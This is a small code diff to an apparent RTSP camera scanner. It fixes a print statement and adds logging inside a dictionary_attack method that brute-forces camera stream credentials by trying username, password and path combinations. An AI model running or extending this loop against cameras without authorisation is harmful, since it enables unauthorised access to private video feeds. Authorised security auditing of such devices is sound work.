@@ -81,11 +81,12 @@ class rtspFluxScanner:
         print("screen was save at " + screenPath)
 
     def dictionary_attack(self):
-        print("dictionnary attack: ") + self._ip
+        print("dictionnary attack: " + self._ip)
         for path in RTSP_local_path:
             for user in RTSP_user:
                 for _pass in RTSP_pass:
                     connection_try_url = "rtsp://" + user + ":" + _pass + "@" + self._ip + "/" + path
+                    print("attack :" + connection_try_url)
                     cap = cv2.VideoCapture(connection_try_url)
                     if cap.isOpened():
                         print("credential cracked: " + connection_try_url)
